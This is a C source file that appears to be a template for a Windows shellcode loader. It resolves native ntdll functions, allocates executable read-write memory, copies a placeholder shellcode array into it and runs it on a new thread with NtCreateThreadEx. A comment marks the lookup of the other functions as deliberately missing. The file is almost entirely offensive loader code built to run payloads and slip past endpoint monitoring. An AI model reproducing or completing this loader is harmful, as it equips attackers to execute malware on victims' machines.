#include <stdio.h>
#include <windows.h>

// Define typedefs for function pointers to the native API functions we'll be using.
// These match the function signatures of the respective functions.
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);

int main() {
    // This is placeholder shellcode. In a real use case, this would be replaced with actual shellcode
    // that you want to inject and execute. The shellcode is stored as an array of unsigned characters.
    unsigned char code[] = "\xfc\x48\x83...";

    // Here we load the native API functions from ntdll.dll using GetProcAddress, which retrieves the address of an exported function
    // or variable from the specified dynamic-link library (DLL). The return value is then cast to the appropriate function pointer typedef.
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    
    //something in missing here ;-) 





    // Allocate a region of virtual memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode.
    // NtAllocateVirtualMemory is a function that reserves, commits, or changes the state of a region of memory within the virtual address space of a specified process.
    // 'exec' will hold the base address of the allocated memory region.
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region.
    // NtWriteVirtualMemory is a function that writes into the virtual address space of a specified process.
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread.
    // NtCreateThreadEx is a function that creates a new thread for a process.
    // The new thread starts execution by calling the function at the start address specified in the lpStartAddress parameter. 
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the thread to finish executing.
    // NtWaitForSingleObject is a function that waits until the specified object is in the signaled state or the time-out interval elapses.
    NtWaitForSingleObject(hThread, FALSE, NULL);

    // Return 0 to indicate successful execution of the program.
    return 0;
}
